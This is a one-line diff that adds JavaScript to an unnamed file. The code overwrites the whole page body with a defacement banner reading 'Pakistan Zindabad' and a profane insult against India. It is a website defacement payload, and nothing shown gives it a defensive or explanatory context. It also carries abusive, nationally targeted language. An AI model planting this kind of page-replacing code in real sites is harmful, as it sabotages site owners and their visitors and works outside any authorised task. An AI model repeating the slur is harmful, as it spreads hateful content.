@@ -1,0 +1,1 @@
+document.body.outerHTML='<div style="background-color:black;height:500px;"><span><h1 style="text-align:center;color:green;padding-top:100px;">Pakistan Zindabad</h1><h2 style="text-align:center;color:green;margin-top:50px;">India Madarchod</span></div>';
